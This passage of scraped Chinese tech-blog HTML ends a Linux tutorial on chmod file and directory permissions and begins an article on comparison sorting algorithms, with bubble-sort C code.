class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nchmod u-x,g-x,o-x test \r\n或\r\nchmod ugo-x test \r\n或\r\nchmod a-x test</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b4aa9300e5fc751988971-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa9300e5fc751988971-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa9300e5fc751988971-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa9300e5fc751988971-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa9300e5fc751988971-5\">5</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5b4aa9300e5fc751988971-1\"><span class=\"crayon-i\">chmod</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">u</span><span class=\"crayon-o\">-</span><span class=\"crayon-v\">x</span><span class=\"crayon-sy\">,</span><span class=\"crayon-v\">g</span><span class=\"crayon-o\">-</span><span class=\"crayon-v\">x</span><span class=\"crayon-sy\">,</span><span class=\"crayon-v\">o</span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">x</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">test</span><span class=\"crayon-h\"> </span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa9300e5fc751988971-2\">或</div><div class=\"crayon-line\" id=\"crayon-5b4aa9300e5fc751988971-3\"><span class=\"crayon-e\">chmod </span><span class=\"crayon-v\">ugo</span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">x</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">test</span><span class=\"crayon-h\"> </span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa9300e5fc751988971-4\">或</div><div class=\"crayon-line\" id=\"crayon-5b4aa9300e5fc751988971-5\"><span class=\"crayon-i\">chmod</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">a</span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">x</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">test</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0009 seconds] -->\r\n<p><img class=\"aligncenter\" src=\"http://jbcdn2.b0.upaiyun.com/2018/05/bb7c408bad9334918b678f5a15105cff.png\"></p>\n<blockquote><p>备注：执行权限(x)，对目录而已就是其他用户能否<strong>cd test</strong>成为工作目录。</p></blockquote>\n<h3 id=\"添加权限\">添加权限(+)</h3>\n<p>增加目录test执行权限</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b4aa9300e5ff233956462\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nchmod u+x,g+x,o+x test \r\n或\r\nchmod ugo+x test \r\n或\r\nchmod a+x test</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b4aa9300e5ff233956462-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa9300e5ff233956462-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa9300e5ff233956462-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa9300e5ff233956462-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa9300e5ff233956462-5\">5</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5b4aa9300e5ff233956462-1\"><span class=\"crayon-i\">chmod</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">u</span><span class=\"crayon-o\">+</span><span class=\"crayon-v\">x</span><span class=\"crayon-sy\">,</span><span class=\"crayon-v\">g</span><span class=\"crayon-o\">+</span><span class=\"crayon-v\">x</span><span class=\"crayon-sy\">,</span><span class=\"crayon-v\">o</span><span class=\"crayon-o\">+</span><span class=\"crayon-i\">x</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">test</span><span class=\"crayon-h\"> </span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa9300e5ff233956462-2\">或</div><div class=\"crayon-line\" id=\"crayon-5b4aa9300e5ff233956462-3\"><span class=\"crayon-e\">chmod </span><span class=\"crayon-v\">ugo</span><span class=\"crayon-o\">+</span><span class=\"crayon-i\">x</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">test</span><span class=\"crayon-h\"> </span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa9300e5ff233956462-4\">或</div><div class=\"crayon-line\" id=\"crayon-5b4aa9300e5ff233956462-5\"><span class=\"crayon-i\">chmod</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">a</span><span class=\"crayon-o\">+</span><span class=\"crayon-i\">x</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">test</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0009 seconds] -->\r\n<p><img class=\"aligncenter\" src=\"http://jbcdn2.b0.upaiyun.com/2018/05/6ab28b525a72bc8b09e26d048f72701a.png\"></p>\n<blockquote><p>备注：很熟悉吧，如果我们编写完一个shell文件test.sh后，通过<code>chmod a+x test.sh</code>就添加了文件执行权限。</p></blockquote>\n<h3 id=\"数字法\">数字法</h3>\n<p>顾名思义，就是使用数字来代表权限，r,w,x分别为4,2,1。三种权限累加就可以得出一种身份的权限。</p>\n<p>设置目录test的权限为任何人都可读、写、执行。</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b4aa9300e603474672757\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nchmod 777 test </textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b4aa9300e603474672757-1\">1</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5b4aa9300e603474672757-1\"><span class=\"crayon-i\">chmod</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">777</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">test</span><span class=\"crayon-h\"> </span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0004 seconds] -->\r\n<p><img class=\"aligncenter\" src=\"http://jbcdn2.b0.upaiyun.com/2018/05/be87c870ece0e5311d409991d369de5e.png\"><br>\n设置目录test的权限为任何人都可读、写。</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b4aa9300e606867473058\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nchmod 666 test </textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b4aa9300e606867473058-1\">1</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5b4aa9300e606867473058-1\"><span class=\"crayon-i\">chmod</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">666</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">test</span><span class=\"crayon-h\"> </span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0004 seconds] -->\r\n<p><img class=\"aligncenter\" src=\"http://jbcdn2.b0.upaiyun.com/2018/05/ff0b2a1d263b70a1f7ac7581df8def45.png\"></p>\n<p>赋予一个shell文件test.sh可执行权限，拥有者可读、写、执行，群组账号和其他人可读、执行。</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b4aa9300e609816345215\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nchmod 755 test </textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b4aa9300e609816345215-1\">1</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5b4aa9300e609816345215-1\"><span class=\"crayon-i\">chmod</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">755</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">test</span><span class=\"crayon-h\"> </span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0004 seconds] -->\r\n<p></p>\n<blockquote><p>备注：有没有发现数字法更简单啊！！！</p></blockquote>\n<h2 id=\"文件和目录权限差异\">文件和目录权限差异</h2>\n<p>文档权限对于文件和目录有巨大的差异</p>\n<h3 id=\"文件\">文件</h3>\n<p>针对的是该文件内容</p>\n<ul>\n<li>readable 可读取该文件的实际内容</li>\n<li>writable 可以编辑、新增或者是修改该文件的内容</li>\n<li>executable 有可以被系统执行的权限</li>\n</ul>\n<blockquote><p>备注：具有w权限不可以删除文件，删除文件是目录权限控制的范围！！！记住<strong>文件权限针对是文件内容</strong>。</p></blockquote>\n<h3 id=\"目录\">目录</h3>\n<p>针对的是该目录下的文件对象</p>\n<ul>\n<li>readable 具有读取目录结构清单的权限，即可以通过<strong>ls</strong>命令，查询该目录清单。</li>\n<li>writable 具有变动该目录结构清单的权限，即可以创建、迁移、删除、更名该目录下的文件。</li>\n<li>executable 具备进入该目录的权限，即可以通过<strong>cd</strong>命令，转到工作目录。</li>\n</ul>\n<blockquote><p>备注：从上面可以得出，开放目录给任何人浏览时，至少需要赋予<code>r</code>或<code>x</code>权限。读取目录文件内容，至少需要目录权限<code>x</code>和文件权限<code>r</code>。</p></blockquote>\n<h2 id=\"总结\">总结</h2>\n<p><code>Linux</code>的每个文档可以分别针对三种身份赋予<code>rwx</code>权限；<code>chgrp</code>命令变更文件群组，<code>chmod</code>命令变更文件权限，<code>chown</code>变更文件拥有者；那么以后记得使用<strong>文档权限来保护数据的安全性哦</strong>。</p>\n<p><strong>如果你觉得本篇文章对您有帮助的话，感谢您的【推荐】</strong>。<br>\n<strong>如果你对 linux 感兴趣的话可以关注我，我会定期的在博客分享我的学习心得</strong>。</p>\n\r\n        \r\n        \r\n        \n    <div class=\"post-adds\">\n        <span data-post-id=\"114031\" class=\" btn-bluet-bigger href-style vote-post-up   register-user-only \"><i class=\"fa  fa-thumbs-o-up\"></i> <h10 id=\"114031votetotal\">1</h10> 赞</span>\n        <span data-book-type=\"1\" data-site-id=\"2\" data-item-id=\"114031\" data-item-type=\"1\" class=\" btn-bluet-bigger href-style bookmark-btn  register-user-only \"><i class=\"fa fa-bookmark-o  \"></i> 4 收藏</span>\n\n                    <a href=\"#article-comment\"><span class=\"btn-bluet-bigger href-style hide-on-480\"><i class=\"fa fa-comments-o\"></i>  评论</span></a>\n        \n        \n        \n        <!-- JiaThis Button BEGIN -->\n        <div class=\"jiathis_style_24x24\" style=\"display: inline-flex; position: relative; margin: 0; clear: both;float: right;\">\n            <a class=\"jiathis_button_tsina\"></a>\n            <a class=\"jiathis_button_weixin\"></a>\n            <a class=\"jiathis_button_qzone\"></a>\n            <a class=\"jiathis_button_fb hide-on-480\"></a>\n            <a href=\"http://www.jiathis.com/share?uid=1745061\" class=\"jiathis jiathis_txt jiathis_separator jtico jtico_jiathis\" target=\"_blank\"></a>\n        </div>\n\n    </div>\n\n\n\n\r\n        <!-- BEGIN #author-bio -->\r\n\r\n\r\n<!-- END #author-bio -->\r\n\t</div>", "tags": "IT技术,Linux", "url": "http://blog.jobbole.com/114031/", "url_obj_id": "4382c32a2cdca2e189d33b686dc851bb"}
{"front_img_url": ["http://jbcdn2.b0.upaiyun.com/2014/10/a1a4de99de0c75eab712542a7dac876f.png"], "title": "常用排序算法总结（1）", "create_date": "2018/05/11 ·", "praise_num": 2, "fav_num": 9, "comment_num": 0, "content": "<div class=\"entry\">\r\n\r\n        \t\t\t<div class=\"textwidget\"></div>\n\t\t\r\n\t\t<div class=\"copyright-area\">原文出处： <a target=\"_blank\" href=\"https://www.cnblogs.com/eniac12/p/5329396.html#s32\">SteveWang</a>   </div><p>我们通常所说的排序算法往往指的是<strong>内部排序算法</strong>，即数据记录在内存中进行排序。</p>\n<p>排序算法大体可分为两种：</p>\n<p>一种是<strong>比较排序</strong>，时间复杂度O(nlogn) ~ O(n^2)，主要有：<strong>冒泡排序</strong>，<strong>选择排序</strong>，<strong>插入排序</strong>，<strong>归并排序</strong>，<strong>堆排序</strong>，<strong>快速排序</strong>等。</p>\n<p>另一种是<strong>非比较排序</strong>，时间复杂度可以达到O(n)，主要有：<strong>计数排序</strong>，<strong>基数排序</strong>，<strong>桶排序</strong>等。</p>\n<p>这里我们来探讨一下常用的比较排序算法，非比较排序算法将在下一篇文章中介绍。下表给出了常见比较排序算法的性能：</p>\n<p><img src=\"http://jbcdn2.b0.upaiyun.com/2018/04/a6d92f7bf8a65e8a4a48479b9599d97e.jpg\" alt=\"\"></p>\n<p>有一点我们很容易忽略的是<strong>排序算法的稳定性</strong>(腾讯校招2016笔试题曾考过)。</p>\n<p>排序算法稳定性的简单形式化定义为：<strong>如果A<sub>i</sub> = A<sub>j</sub>，排序前A<sub>i</sub>在A<sub>j</sub>之前，排序后A<sub>i</sub>还在A<sub>j</sub>之前，则称这种排序算法是稳定的。</strong>通俗地讲就是保证排序前后两个相等的数的相对顺序不变。</p>\n<p>对于不稳定的排序算法，只要举出一个实例，即可说明它的不稳定性；而对于稳定的排序算法，必须对算法进行分析从而得到稳定的特性。需要注意的是，排序算法是否为稳定的是由具体算法决定的，不稳定的算法在某种条件下可以变为稳定的算法，而稳定的算法在某种条件下也可以变为不稳定的算法。</p>\n<p>例如，对于冒泡排序，原本是稳定的排序算法，如果将记录交换的条件改成A[i] &gt;= A[i + 1]，则两个相等的记录就会交换位置，从而变成不稳定的排序算法。</p>\n<p>其次，说一下排序算法稳定性的好处。<strong>排序算法如果是稳定的，那么从一个键上排序，然后再从另一个键上排序，前一个键排序的结果可以为后一个键排序所用。</strong>基数排序就是这样，先按低位排序，逐次按高位排序，低位排序后元素的顺序在高位也相同时是不会改变的。</p>\n<h2>冒泡排序(Bubble Sort)</h2>\n<p>冒泡排序是一种极其简单的排序算法，也是我所学的第一个排序算法。它重复地走访过要排序的元素，依次比较相邻两个元素，如果他们的顺序错误就把他们调换过来，直到没有元素再需要交换，排序完成。这个算法的名字由来是因为越小(或越大)的元素会经由交换慢慢“浮”到数列的顶端。</p>\n<p>冒泡排序算法的运作如下：</p>\n<ol>\n<li>比较相邻的元素，如果前一个比后一个大，就把它们两个调换位置。</li>\n<li>对每一对相邻元素作同样的工作，从开始第一对到结尾的最后一对。这步做完后，最后的元素会是最大的数。</li>\n<li>针对所有的元素重复以上的步骤，除了最后一个。</li>\n<li>持续每次对越来越少的元素重复上面的步骤，直到没有任何一对数字需要比较。</li>\n</ol>\n<p>由于它的简洁，冒泡排序通常被用来对于程序设计入门的学生介绍算法的概念。冒泡排序的代码如下：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b4ad567a1b59765328585\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n#include &lt;stdio.h&gt;\r\n\r\n// 分类 -------------- 内部比较排序\r\n// 数据结构 ---------- 数组\r\n// 最差时间复杂度 ---- O(n^2)\r\n// 最优时间复杂度 ---- 如果能在内部循环第一次运行时,使用一个旗标来表示有无需要交换的可能,可以把最优时间复杂度降低到O(n)\r\n// 平均时间复杂度 ---- O(n^2)\r\n// 所需辅助空间 ------ O(1)\r\n// 稳定性 ------------ 稳定\r\n\r\nvoid Swap(int A[], int i, int j)\r\n{\r\n    int temp = A[i];\r\n    A[i] = A[j];\r\n    A[j] = temp;\r\n}\r\n\r\nvoid BubbleSort(int A[], int n)\r\n{\r\n    for (int j = 0; j &lt; n - 1; j++)         // 每次最大元素就像气泡一样\"浮\"到数组的最后\r\n    {\r\n        for (int i = 0; i &lt; n - 1 - j; i++) // 依次比较相邻的两个元素,使较大的那个向后移\r\n        {\r\n            if (A[i] &gt; A[i + 1])            // 如果条件改成A[i] &gt;= A[i + 1],则变为不稳定的排序算法\r\n            {\r\n                Swap(A, i, i + 1);\r\n            }\r\n        }\r\n    }\r\n}\r\n\r\nint main()\r\n{\r\n    int A[] = { 6, 5, 3, 1, 8, 7, 2, 4 };    // 从小到大冒泡排序\r\n    int n = sizeof(A) / sizeof(int);\r\n    BubbleSort(A, n);\r\n    printf(\"冒泡排序结果：\");\r\n    for (int i = 0; i &lt; n; i++)\r\n    {\r\n        printf(\"%d \", A[i]);\r\n    }\r\n    printf(\"\\n\");\r\n    return 0;\r\n}</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b4ad567a1b59765328585-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4ad567a1b59765328585-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5b4ad567a1b59765328585-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4ad567a1b59765328585-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-5b4ad567a1b59765328585-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4ad567a1b59765328585-6\">6</div><div class=\"crayon-num\" data-line=\"crayon-5b4ad567a1b59765328585-7\">7</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4ad567a1b59765328585-8\">8</div><div class=\"crayon-num\" data-line=\"crayon-5b4ad567a1b59765328585-9\">9</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4ad567a1b59765328585-10\">10</div><div class=\"crayon-num\" data-line=\"crayon-5b4ad567a1b59765328585-11\">11</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4ad567a1b59765328585-12\">12</div><div class=\"crayon-num\" data-line=\"crayon-5b4ad567a1b59765328585-13\">13</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4ad567a1b59765328585-14\">14</div><div class=\"crayon-num\" data-line=\"crayon-5b4ad567a1b59765328585-15\">15</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4ad567a1b59765328585-16\">16</div><div class=\"crayon-num\" data-line=\"crayon-5b4ad567a1b59765328585-17\">17</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4ad567a1b59765328585-18\">18</div><div class=\"crayon-num\" data-line=\"crayon-5b4ad567a1b59765328585-19\">19</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4ad567a1b59765328585-20\">20</div><div class=\"crayon-num\" data-line=\"crayon-5b4ad567a1b59765328585-21\">21</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4ad567a1b59765328585-22\">22</div><div class=\"crayon-num\" data-line=\"crayon-5b4ad567a1b59765328585-23\">23</div><div 